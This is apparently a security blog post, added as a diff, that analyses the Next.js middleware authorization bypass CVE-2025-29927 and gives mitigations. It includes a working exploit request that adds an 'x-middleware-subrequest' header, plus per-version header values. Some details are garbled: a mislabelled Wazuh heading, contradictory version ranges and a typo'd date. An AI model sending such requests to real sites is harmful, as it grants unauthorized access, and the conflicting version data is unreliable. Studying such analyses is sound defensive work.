@@ -1,0 +1,177 @@
+---
+id: 2
+title: "CVE-2025-29927: Next.js Middleware Authorization Bypass"
+date: "Apil 16, 2025"
+category: "vulnerability"
+tags: ["CVE", "VulnerabilityResearch", "InfoSec", "Exploits","TechnicalAnalysis"]
+author: "Hamza Khattak"
+image: "/assets/img/blog/nextjs_blog.png"
+authorQuote: "Stay Vigilant, Stay Secure"
+---
+
+![CVE-2025-24016](/assets/img/blog/nextjs_blog.png)
+
+### CVE-2025-2401: Unsafe Deserialization in Wazuh – RCE
+
+### Description
+Next.js, an open-source web framework developed by Vercel, powers modern React-based applications with advanced features like server-side rendering and static site generation. Recently, a critical vulnerability (CVE-2025-29927) was uncovered, allowing attackers to bypass middleware-based authorization checks. This flaw was initially discovered and analyzed by Rachid Allam (zhero). In this post, we’ll dive into the technical details of the vulnerability, explore Rachid’s research, and craft a Nuclei template to help you detect this issue across your environment.
+
+The vulnerability impacts Next.js middleware, a key feature often used to enforce authorization, rewrite paths, handle server-side redirects, and apply response headers like Content Security Policy (CSP).
+
+By exploiting this flaw, an attacker can completely bypass middleware logic simply by adding a malicious `x-middleware-subrequest` HTTP header to their requests.
+
+
+### Technical Breakdown
+
+- **Affected Software**: Next.js  
+- **Affected Versions**: 1.11.4 - 12.3.5, 13.5.9, 14.2.25, and 15.2.3  
+- **CVSSv3.1 Score**: 9.1 (Critical)  
+- **CVSSv3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`  
+- **Affected Component**: Middleware  
+- **Attack Vector**: Network  
+- **Privileges Required**: Low (API Access)  
+- **User Interaction**: None  
+- **Scope**: Unchanged  
+
+The vulnerability affects Next.js versions 11.1.4 through 13.5.6, as well as 14.x before 14.2.25 and 15.x before 15.2.3. The implications are severe for applications that depend on middleware for access control, as this can lead to unauthorized access to protected routes or resources—without authentication.
+
+### Affected Component Analysis
+
+In Next.js applications, middleware plays a critical role in handling tasks like authentication, logging, and security enforcement for all incoming requests. CVE-2025-29927 stems from how Next.js improperly processes the x-middleware-subrequest header internally.
+
+Here's how the vulnerability works at the code level:javascript
+
+
+```javascript
+const subreq = params.request.headers["x-middleware-subrequest"];
+const subrequests = typeof subreq === "string" ? subreq.split(":") : [];
+
+if (subrequests.includes(middlewareInfo.name)) {
+  result = {
+    response: NextResponse.next(),
+    waitUntil: Promise.resolve(),
+  }
+  continue;
+}
+```
+
+The x-middleware-subrequest header is a special internal flag used by Next.js to signal that a request was generated within the framework itself specifically, as a subrequest triggered by middleware, not as a direct client request. This mechanism is essential for the proper functioning of Next.js features and helps prevent infinite middleware recursion by keeping track of internal calls.
+
+![nextjs_blog_0.png](/assets/img/blog/nextjs_blog_0.png)
+
+However, this internal trust in the presence of the header introduces a serious flaw: attackers can craft requests that include this header, tricking Next.js into treating them as internal. As a result, middleware logic such as authentication checks can be completely bypassed.
+
+
+### Exploitation Techniques
+
+The method of exploitation slightly differs depending on the version of Next.js being used:
+
+| **Next.js Version**       | **Middleware Naming/Location**                                | **Header Format (x-middleware-subrequest)**                                      |
+|---------------------------|---------------------------------------------------------------|----------------------------------------------------------------------------------|
+| **Prior to 12.2**          | `_middleware.ts` in `pages` folder                            | `pages/_middleware`                                                              |
+| **Nested Routes (Prior to 12.2)** | `_middleware.ts` in nested `pages` directories         | `pages/dashboard/_middleware`, `pages/dashboard/panel/_middleware`               |
+| **12.2 and Later**         | `middleware.ts` (no underscore), not in `pages` folder        | `middleware`                                                                      |
+| **12.2 and Later (with /src)** | `middleware.ts` inside `/src` directory                     | `src/middleware`                                                                 |
+| **13.2.0 and Later**       | Same as 12.2+ but with recursion depth limit for middleware  | `middleware:middleware:middleware...` or `src/middleware:src/middleware...`      |
+
+
+To illustrate the vulnerability, imagine a Next.js app with middleware that guards the `/protected` route by redirecting unauthorized users to `/login`.  
+Normally request to `/protected` without proper authorization results in a redirect to `/login`.
+
+**Request:**
+```
+GET /protected HTTP/1.1  
+Host: 192.168.44.201:3000  
+Upgrade-Insecure-Requests: 1  
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36  
+Connection: keep-alive
+```
+
+**Response:**
+```
+HTTP/1.1 307 Temporary Redirect  
+location: /  
+Date: Wed, 16 Apr 2025 09:52:51 GMT  
+Connection: keep-alive  
+Keep-Alive: timeout=5  
+Content-Length: 1  
+/
+```
+
+An attacker can bypass this protection by sending a request with the appropriate header:
+
+**Request:**
+```
+GET /protected HTTP/1.1  
+Host: 192.168.44.201:3000  
+Upgrade-Insecure-Requests: 1  
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36  
+x-middleware-subrequest: middleware  
+Connection: keep-alive
+```
+
+**Response:**
+![nextjs_blog_0.png](/assets/img/blog/nextjs_blog_1.png)
+
+By including a specific header, the request bypasses the middleware’s authorization logic entirely and proceeds straight to /protected, giving the attacker unauthorized access to restricted content.
+
+
+### Mitigation Strategies
+
+1. **Upgrade to a Patched Version**
+The most effective mitigation is to upgrade to a secure version of Next.js where this vulnerability has been fixed.
+
+Patched versions:
+- 12.3.5
+- 13.5.9
+- 14.2.25
+- 15.2.3
+
+Upgrading ensures the issue is resolved at the framework level without requiring manual workarounds.
+
+If upgrading is not immediately feasible, apply the following temporary mitigations:
+
+#### 2. Strip the Header at the Load Balancer
+
+If your application is behind a load balancer (e.g., AWS ELB, Cloudflare), configure it to remove the `x-middleware-subrequest` header from all incoming traffic.
+
+---
+
+#### 3. Configure Web Server to Remove the Header
+
+**Nginx**  
+Add this to your server block to strip the header:
+
+```nginx
+proxy_set_header x-middleware-subrequest "";
+```
+
+**Apache (mod_headers)**  
+Use this directive to unset the header:
+
+```apache
+RequestHeader unset x-middleware-subrequest
+```
+
+---
+
+#### 4. Custom Server Middleware (e.g., Express)
+
+If you're using a custom server with Express, strip the header before it reaches Next.js:
+
+```javascript
+app.use((req, res, next) => {
+  delete req.headers['x-middleware-subrequest'];
+  next();
+});
+```
+
+
+### References
+
+- [GitHub Security Advisory](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw)  
+- [Proof of Concept GitHub Repo](https://github.com/mhamzakhattak/CVE-2025-29927)
+- [Next.js Middleware Documentation](https://nextjs.org/docs/app/building-your-application/routing/middleware)  
+- [Original Research](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware)  
+
+---
